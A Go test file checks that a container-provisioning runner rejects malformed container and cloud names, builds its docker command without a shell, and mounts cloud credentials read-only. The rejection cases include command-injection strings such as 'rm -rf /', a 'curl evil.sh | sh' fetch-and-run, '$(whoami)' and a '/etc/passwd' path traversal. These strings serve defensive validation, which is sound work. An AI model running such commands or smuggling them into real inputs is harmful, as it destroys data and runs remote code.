package runner

import (
	"slices"
	"strings"
	"testing"
)

func TestValidateRejectsUnknownContainer(t *testing.T) {
	cases := []string{
		"",
		"ubuntu",
		"gen3tf; rm -rf /",
		"gen3tf && curl evil.sh | sh",
		"../../etc/passwd",
		"$(whoami)",
	}
	for _, container := range cases {
		req := ProvisionRequest{Container: container, Cloud: "aws"}
		if err := req.validate(); err == nil {
			t.Errorf("validate() accepted container %q, want rejection", container)
		}
	}
}

func TestValidateRejectsUnknownCloud(t *testing.T) {
	for _, cloud := range []string{"", "aws; id", "onprem"} {
		req := ProvisionRequest{Container: "gen3tf", Cloud: cloud}
		if err := req.validate(); err == nil {
			t.Errorf("validate() accepted cloud %q, want rejection", cloud)
		}
	}
}

func TestValidateAcceptsAllowlistedRequest(t *testing.T) {
	req := ProvisionRequest{Container: "gen3tf", Cloud: "aws", Plan: true}
	if err := req.validate(); err != nil {
		t.Fatalf("validate() rejected an allowlisted request: %v", err)
	}
}

// The command must be docker invoked directly -- never a shell -- so that no
// argument can be interpreted as a command.
func TestArgvDoesNotUseAShell(t *testing.T) {
	req := ProvisionRequest{Container: "gen3tf", Cloud: "aws"}
	command, args := req.argv()

	if command != "docker" {
		t.Errorf("argv() command = %q, want \"docker\"", command)
	}
	for _, shell := range []string{"sh", "bash", "/bin/sh", "/bin/bash"} {
		if command == shell {
			t.Fatalf("argv() invokes a shell (%q)", command)
		}
	}
	if slices.Contains(args, "-c") {
		t.Errorf("argv() args contain -c, which implies shell interpretation: %v", args)
	}
}

func TestArgvRendersBoolsNotStrings(t *testing.T) {
	req := ProvisionRequest{Container: "gen3tf", Cloud: "aws", Plan: true, Destroy: false}
	_, args := req.argv()
	joined := strings.Join(args, " ")

	for _, want := range []string{"PLAN=true", "DESTROY=false", "DEPLOY=false"} {
		if !strings.Contains(joined, want) {
			t.Errorf("argv() args missing %q, got: %v", want, args)
		}
	}
}

func TestArgvOmitsCredentialMountWhenUnset(t *testing.T) {
	t.Setenv("RUNNER_CLOUD_CREDENTIALS_DIR", "")
	req := ProvisionRequest{Container: "gen3tf", Cloud: "aws"}
	_, args := req.argv()
	if strings.Contains(strings.Join(args, " "), "/root/.aws") {
		t.Errorf("argv() mounted credentials with no dir configured: %v", args)
	}
}

func TestArgvMountsCredentialsReadOnlyWhenConfigured(t *testing.T) {
	t.Setenv("RUNNER_CLOUD_CREDENTIALS_DIR", "/etc/gen3/aws")
	req := ProvisionRequest{Container: "gen3tf", Cloud: "aws"}
	_, args := req.argv()

	idx := slices.Index(args, "/etc/gen3/aws:/root/.aws:ro")
	if idx == -1 {
		t.Fatalf("argv() did not mount the configured credentials dir read-only: %v", args)
	}
	if args[idx-1] != "-v" {
		t.Errorf("credential mount not preceded by -v: %v", args)
	}
}
